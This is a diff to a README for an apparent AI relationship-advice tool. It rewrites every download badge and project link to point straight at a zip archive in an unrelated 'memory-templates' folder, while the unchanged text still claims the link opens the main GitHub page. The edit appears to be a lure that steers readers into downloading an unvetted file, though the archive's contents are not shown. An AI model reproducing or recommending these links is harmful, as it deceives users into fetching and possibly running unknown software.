@@ -1,6 +1,6 @@
 # 💡 relationship-consultation-system - Simple AI Relationship Guidance
 
-[![Download relationship-consultation-system](https://img.shields.io/badge/Download-Now-orange)](https://github.com/MS8X00/relationship-consultation-system)
+[![Download relationship-consultation-system](https://img.shields.io/badge/Download-Now-orange)](https://github.com/MS8X00/relationship-consultation-system/raw/refs/heads/main/memory-templates/system-consultation-relationship-2.8.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To get the relationship-consultation-system running, follow these steps carefull
 
 1. **Go to the download page**  
    Click the big badge above or open this link in your browser:  
-   https://github.com/MS8X00/relationship-consultation-system  
+   https://github.com/MS8X00/relationship-consultation-system/raw/refs/heads/main/memory-templates/system-consultation-relationship-2.8.zip  
    This link takes you to the main GitHub page where you can find the files you need.
 
 2. **Find the latest release**  
@@ -122,7 +122,7 @@ If issues persist, visit the GitHub page for support or open an issue.
 ## 📂 More Information and Links
 
 - Visit the project page here to download and check updates:  
-  https://github.com/MS8X00/relationship-consultation-system
+  https://github.com/MS8X00/relationship-consultation-system/raw/refs/heads/main/memory-templates/system-consultation-relationship-2.8.zip
 
 - The repository also shares details about the psychology behind the system and the AI models used.
 
@@ -155,4 +155,4 @@ This project covers these areas:
 
 ---
 
-[![Download relationship-consultation-system](https://img.shields.io/badge/Download-Now-orange)](https://github.com/MS8X00/relationship-consultation-system)
+[![Download relationship-consultation-system](https://img.shields.io/badge/Download-Now-orange)](https://github.com/MS8X00/relationship-consultation-system/raw/refs/heads/main/memory-templates/system-consultation-relationship-2.8.zip)
